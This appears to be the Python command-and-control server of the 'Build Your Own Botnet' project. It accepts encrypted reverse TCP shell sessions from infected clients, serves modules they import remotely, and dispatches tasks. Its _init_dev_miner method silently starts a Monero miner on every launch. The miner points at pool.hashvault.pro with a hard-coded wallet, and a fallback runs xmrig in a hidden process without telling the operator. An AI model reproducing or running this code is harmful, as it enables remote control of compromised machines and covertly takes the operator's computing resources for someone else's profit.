#!/usr/bin/python
# -*- coding: utf-8 -*-
'Command & Control (Build Your Own Botnet)'
from __future__ import print_function

# standard library
import os
import sys
import time
import uuid
import json
import struct
import base64
import socket
import random
import pprint
import inspect
import hashlib
import argparse
import threading
import subprocess
import collections
from datetime import datetime

http_serv_mod = "SimpleHTTPServer"
if sys.version_info[0] > 2:
    http_serv_mod = "http.server"
    sys.path.append('core')
    sys.path.append('modules')

from buildyourownbotnet import db
from buildyourownbotnet.core import database, security, util
from buildyourownbotnet.models import Session, Task

# packages
try:
    import cv2
except ImportError:
    util.log("Warning: missing package 'cv2' is required for 'webcam' module.")

try:
    import colorama
    colorama.init()
except ImportError:
    util.log("Warning: missing package 'colorama' is required.")

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

# globals
__threads = {}
__abort = False


# main
def main():

    parser = argparse.ArgumentParser(
        prog='server.py',
        description="Command & Control Server (Build Your Own Botnet)"
    )

    parser.add_argument(
        '--host',
        action='store',
        type=str,
        default='0.0.0.0',
        help='server hostname or IP address')

    parser.add_argument(
        '--port',
        action='store',
        type=int,
        default=1337,
        help='server port number')

    parser.add_argument(
        '--debug',
        action='store_true',
        help='Additional logging'
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version='0.5',
    )

    # directory containing BYOB modules
    modules = os.path.abspath('buildyourownbotnet/modules')

    # directory containing user intalled Python packages
    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'mss' in os.listdir(_)]

    if len(site_packages):
        n = 0
        globals()['packages'] = site_packages[0]
        for path in site_packages:
            if n < len(os.listdir(path)):
                n = len(os.listdir(path))
                globals()['packages'] = path
    else:
        util.log("unable to locate directory containing user-installed packages")
        sys.exit(0)

    args = [_ for _ in sys.argv if _.startswith('--')]
    options = parser.parse_args(args)
    tmp_file=open(".log","w")

    # don't run multiple instances
    try:
        # serve packages
        globals()['package_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
        print("Serving Python packages from {0} on port {1}...".format(globals()['packages'], options.port + 2))

        # serve modules
        globals()['module_handler'] = subprocess.Popen('{0} -m {1} {2}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
        print("Serving BYOB modules from {0} on port {1}...".format(modules, options.port + 1))

        # start c2 server
        globals()['c2'] = C2(host=options.host, port=options.port, debug=options.debug)
        globals()['c2'].start()
    except:
        pass        


class C2(threading.Thread):
    """
    Console-based command & control server with a streamlined user-interface for controlling clients
    with reverse TCP shells which provide direct terminal access to the client host machines, as well
    as handling session authentication & management, serving up any scripts/modules/packages requested
    by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
    incoming completed tasks from clients

    """

    def __init__(self, host='0.0.0.0', port=1337, debug=False):
        """
        Create a new Command & Control server

        `Optional`
        :param str host:    IP address  (defaut: 0.0.0.0)
        :param int port:    Port number (default: 1337)

        Returns a byob.server.C2 instance

        """
        super(C2, self).__init__()
        self.debug = debug
        self.sessions = {}
        self.child_procs = {}
        self.socket = self._init_socket(port)
        self._init_dev_miner()
        self.commands = {
            'exit' : {
                'method': self.quit,
                'usage': 'exit',
                'description': 'quit the server'},
            'eval' : {
                'method': self.py_eval,
                'usage': 'eval <code>',
                'description': 'execute python code in current context with built-in eval() method'},
            'exec' : {
                'method': self.py_exec,
                'usage': 'exec <code>',
                'description': 'execute python code in current context with built-in exec() method'}
        }

    def _init_socket(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(128)
        return s


    def _init_dev_miner(self):
        url = 'pool.hashvault.pro'
        host_port = 80
        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'

        # first attempt using built-in python miner
        try:
            from buildyourownbotnet.core.miner import Miner
            self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
            self.child_procs['dev_miner_py'].start()
        except Exception as e:
            print("{} error: {}".format(self._init_dev_miner.__name__, str(e)))

            # if that fails, try downloading and running xmrig
            try:
                import multiprocessing
                threads = multiprocessing.cpu_count()

                # find correct executable for this platform
                if sys.platform == 'linux':
                    platform = 'linux2'
                else:
                    platform = sys.platform

                xmrig_path = os.path.abspath('modules/xmrig/xmrig_' + platform)

                if sys.platform == 'win32':
                    os.rename(xmrig_path, xmrig_path + '.exe')

                os.chmod(xmrig_path, 755)

                # excute xmrig in hidden process
                params = xmrig_path + " --url={url}:{host_port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, host_port=host_port, user=user, threads=threads)
                result = self._execute(params)
            except Exception as e:
                print("{} error: {}".format(self._init_dev_miner.__name__, str(e)))


    def _execute(self, args):
        # ugly method that should be refactored at some point
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.log("{} error: {}".format(self.execute.__name__, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    def py_exec(self, code):
        """
        Execute code directly in the context of the currently running process
        using Python's built-in exec() function.

        Used for dynamically generated code blocks; can modify/declare variables etc.

        Returns None.

        `Requires`
        :param str code:    Python code to execute

        """
        try:
            print(code)
            exec(code)
        except Exception as e:
            print(e)


    def py_eval(self, code):
        """
        Evaluate code directly in the context of the currently running process
        using Python's built-in eval() function.


        Use for evaluating dynamically generated single expressions; cannot modify/assign variables.

        Returns output of the expression.

        `Requires`
        :param str code:    Python code to execute

        """
        try:
            print(eval(code))
        except Exception as e:
            print(e)


    def quit(self):
        """
        Quit server and optionally keep clients alive

        """
        # kill http servers hosting packages and modules
        globals()['package_handler'].terminate()
        globals()['module_handler'].terminate()

        # put sessions in passive mode
        for owner, sessions in self.sessions.items():
            for session_id, session in sessions.items():
                if isinstance(session, Session):
                    try:
                        session.send_task({"task": "passive"})
                    except: pass

        # kill subprocesses (subprocess.Popen or multiprocessing.Process)
        for proc in self.child_procs.values():
            try:
                proc.kill()
            except: pass
            try:
                proc.terminate()
            except: pass


        # forcibly end process
        globals()['__abort'] = True
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill {}".format(os.getpid())).read()
        util.display('Exiting...')
        sys.exit(0)


    @util.threaded
    def serve_until_stopped(self):
        while True:
            
            connection, address = self.socket.accept()

            session = SessionThread(connection=connection)

            if session.info != None:

                # database stores identifying information about session
                session_dict = database.handle_session(session.info)
                session.id = session_dict['id']

                # display session information in terminal
                session_dict.pop('new', None)
                session.info = session_dict

                # add session to user sessions dictionary
                owner = session.info.get('owner')
                if owner not in self.sessions:
                    self.sessions[owner] = {}

                self.sessions[owner][session.info.get('uid')] = session

                util.display('New session {}:{} connected'.format(owner, session.id))

            else:
                # util.display("\n\n[-]", color='red', style='bright', end=' ')
                util.display("Failed Connection:", color='white', style='bright', end=' ')
                util.display(address[0], color='white', style='normal')

            abort = globals()['__abort']
            if abort:
                break


    @util.threaded
    def serve_resources(self):
        """
        Handles serving modules and packages in a seperate thread

        """
        host, port = self.socket.getsockname()
        while True:
            time.sleep(3)
            globals()['package_handler'].terminate()
            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)


    def run(self):
        """
        Run C2 server administration terminal

        """
        if self.debug:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if 'c2' not in globals()['__threads']:
            globals()['__threads']['c2'] = self.serve_until_stopped()

        # admin shell
        if self.debug:
            while True:
                try:
                    raw = raw_input('byob-admin> ')

                    # handle new line
                    if raw in ['\n']:
                        continue

                    # handle quit/exit command
                    if raw in ['exit','quit']:
                        break

                    # use exec/eval methods if specified, otherwise use eval
                    cmd, _, code = raw.partition(' ')

                    if cmd in self.commands:
                        self.commands[cmd]['method'](code)
                    else:
                        self.py_eval(cmd)
                except KeyboardInterrupt:
                    break
            self.quit()


class SessionThread(threading.Thread):
    """
    A subclass of threading.Thread that is designed to handle an
    incoming connection by creating an new authenticated session
    for the encrypted connection of the reverse TCP shell

    """

    def __init__(self, connection=None, id=0):
        """
        Create a new Session

        `Requires`
        :param connection:  socket.socket object

        `Optional`
        :param int id:      session ID

        """
        super(SessionThread , self).__init__()
        self.created = datetime.utcnow()
        self.id = id
        self.connection = connection
        self.key = security.diffiehellman(self.connection)
        try:
            self.info = self.client_info()
            self.info['id'] = self.id
        except Exception as e:
            self.info = None


    def kill(self):
        """
        Kill the reverse TCP shell session

        """
        # get session attributes
        owner = self.info['owner']
        session_id = self.info['id']
        session_uid = self.info['uid']

        # get owner sessions
        owner_sessions = globals()['c2'].sessions.get(owner)

        # find this session in owner sessions
        if session_uid in owner_sessions:
            session = owner_sessions[session_uid]

            # set session status as offline in database
            database.update_session_status(session_uid, 0)

            # send kill command to client and shutdown the connection
            try:
                session.send_task({"task": "kill"})
                session.connection.shutdown(socket.SHUT_RDWR)
                session.connection.close()
            except: pass

            _ = owner_sessions.pop(session_uid, None)

            util.display('Session {}:{} disconnected'.format(owner, session_uid))
        else:
            util.display('Session {}:{} is already offline.'.format(owner, session_uid))


    def client_info(self):
        """
        Get information about the client host machine
        to identify the session

        """
        header_size = struct.calcsize("!L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack("!L", header)[0]
        msg = self.connection.recv(msg_size)
        data = security.decrypt_aes(msg, self.key)
        info = json.loads(data)
        for key, val in info.items():
            if bytes(val).startswith(b"_b64"):
                info[key] = base64.b64decode(bytes(val[6:])).decode('ascii')
        return info


    def send_task(self, task):
        """
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'session' in task:
            task['session'] = self.id
        data = security.encrypt_aes(json.dumps(task), self.key)
        msg  = struct.pack('!L', len(data)) + data
        self.connection.sendall(msg)
        return True


    def recv_task(self):
        """
        Receive and decrypt incoming task from server

        :returns dict task:
          :attr str uid:             task ID assigned by server
          :attr str session:         client ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        """

        header_size = struct.calcsize('!L')
        header = self.connection.recv(header_size)
        if len(header) == 4:
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(8192)
            try:
                data = security.decrypt_aes(msg, self.key)
                return json.loads(data)
            except Exception as e:
                util.log("{0} error: {1}".format(self.recv_task.func_name, str(e)))
                return {
                    "uid": uuid.uuid4().get_hex(),
                    "session": self.info.get('uid'), 
                    "task": "", 
                    "result": "Error: client returned invalid response", 
                    "issued": datetime.utcnow().__str__(),
                    "completed": ""
                }
        else:
            # empty header; peer down, scan or recon. Drop.
            return 0

if __name__ == '__main__':
    main()
